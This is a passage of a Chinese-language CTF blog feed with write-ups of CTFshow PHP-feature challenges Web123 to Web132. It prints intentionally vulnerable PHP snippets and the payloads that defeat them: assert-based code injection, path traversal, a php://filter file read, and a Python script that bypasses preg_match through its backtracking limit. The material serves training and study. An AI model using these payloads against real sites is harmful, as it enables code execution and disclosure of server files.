punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里直接借用大佬博客上的脚本，可以看到PHPinfo</p><h3 id="Web271"><a href="#Web271" class="headerlink" title="Web271"></a>Web271</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之webPHP特性下</title>
      <link href="/2022/07/11/CTFshow%E4%B9%8BPHP%E7%89%B9%E6%80%A7%E4%B8%8B/"/>
      <url>/2022/07/11/CTFshow%E4%B9%8BPHP%E7%89%B9%E6%80%A7%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>因为之前时间的关系CTFshow的内容很多专题是做了一半，现在是把那些没做完的内容补上。</p></blockquote><p>[TOC]</p><h3 id="Web123"><a href="#Web123" class="headerlink" title="Web123"></a>Web123</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以如果我们直接传CTF_SHOW.COM是会被转换成CFT_SHOW_COM的，绕过的话这里要利用它的判定规则，当变量名中存在两个不合法字符时，只转换前面的那一个。[和.并存时，会转换前面的[，而[转换之后恰好为_，从而可以绕过。</p><h3 id="Web125"><a href="#Web125" class="headerlink" title="Web125"></a>Web125</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php">$argv</a>：传递给脚本的参数数组</p><h3 id="Web126"><a href="#Web126" class="headerlink" title="Web126"></a>Web126</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源代码第六行使用 isset 语句判断，所以我们需要定义 CTF_SHOW ，CTF_SHOW.COM，但是不能声明fl0g，但是后面的判断中fl0g===”flag_give_me”才能得到flag，这里就需要我们通过 CTF_SHOW ，CTF_SHOW.COM两个参数绕过。</p><blockquote><p>assert函数</p><p>bool assert ( mixed $assertion [, Throwable $exception ] ) ， eval和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加。 </p></blockquote><pre class="line-numbers language-none"><code class="language-none">GET:?$fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Web127"><a href="#Web127" class="headerlink" title="Web127"></a>Web127</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-array-extract.html">extract抽取函数</a>：通常情况结合数组使用，?ctf_show=ilove36d但是下划线被过滤了，这里又一次用到了上面讲到的内容，当变量名中存在会将其转化为_ 空格是经典的非法参数，我们就可以用%20进行绕过</p><h3 id="Web128"><a href="#Web128" class="headerlink" title="Web128"></a>Web128</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web129"><a href="#Web129" class="headerlink" title="Web129"></a>Web129</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> stripos() 函数查找字符串在另一字符串中第一次出现的位置 ，readfile() 函数输出一个文件。同时stripos($f, ‘ctfshow’)&gt;0说明ctfshow不能放在首部。</p><blockquote><p>这道题解法也有不少，比如目录穿越 ?f=/ctfshow/../../../../../var/www/html/flag.php</p><p>再比如filter伪协议，?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php </p><p>甚至我们可以 ?f=./ctfshow/../flag.php 先进入名为ctfshow的下级文件夹在穿越回去，这个跟第一个本质上是一样的…..</p></blockquote><h3 id="Web130"><a href="#Web130" class="headerlink" title="Web130"></a>Web130</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 直接绕过正则表达式： f=ctfshow</p><p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复,所以在ctfshow前面必须有至少一个字符，才会返回true。所以才有了直接f=ctfshow。</p><p>这一道题也可以通过数组绕过，因为stripos函数无法处理数组， 可以直接传f[]=1， </p><h3 id="Web131"><a href="#Web131" class="headerlink" title="Web131"></a>Web131</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以利用回溯限制来绕过。</p><p>当回溯的次数绕过了25万是preg_match返回的非1和0，而是false，所以可以绕过preg_match函数。这里ctfshow提供的wp不知道为什么我做不出来……</p><p>这边利用回溯限制来绕过，当回溯的次数绕过了25万是preg_match返回的非1和0，而是false，所以可以绕过preg_match函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://8d380352-394f-4754-8bde-5c906930bcd2.challenge.ctf.show/'</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'f'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'ctfshow'</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web132"><a href="#Web132" class="headerlink" title="Web132"></a>Web132</h3><p>打开是一个网站，访问robots.txt得到/admin打开/admin获得题目。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#error_reporting(0);</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于<code>与</code>(&amp;&amp;) 运算： <code>x &amp;&amp; y </code>当x为false时，直接跳过，不执行y； 对于或<code>（||）</code> 运算 ： x||y 